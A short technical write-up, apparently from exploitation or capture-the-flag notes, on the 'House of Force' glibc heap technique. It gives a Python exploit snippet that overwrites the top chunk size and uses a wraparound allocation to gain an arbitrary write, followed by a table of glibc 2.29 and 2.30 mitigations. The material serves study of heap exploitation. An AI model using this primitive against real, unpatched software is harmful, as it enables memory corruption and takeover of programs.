 
## Implementation

Simple arbitrary write primitive that works if we can overwrite the top chunk size.
We overwrite it to the biggest value possible, then we malloc right before our target write address, and finally malloc our target write address to write data to it.

```python
def delta(start, end): # if we have to wraparound
    return (0xffffffffffffffff - start) + end
    
malloc(24, b"Y"*24 + p64(0xffffffffffffffff))
distance = delta(heap + 0x20, elf.sym.target - 0x20)
malloc(distance, b"Y")
malloc(24, "winwin")
```

## Mitigation

|GLIBC VERSION|PATCHES|
|---|---|
|2.29|glibc ensures that the top chunk size does not exceed its arena’s system_mem value.|
|2.30|Wrap around to VA space, glibc introduced a maximum allocation size check, which limits the size of the gap the House of Force can bridge.|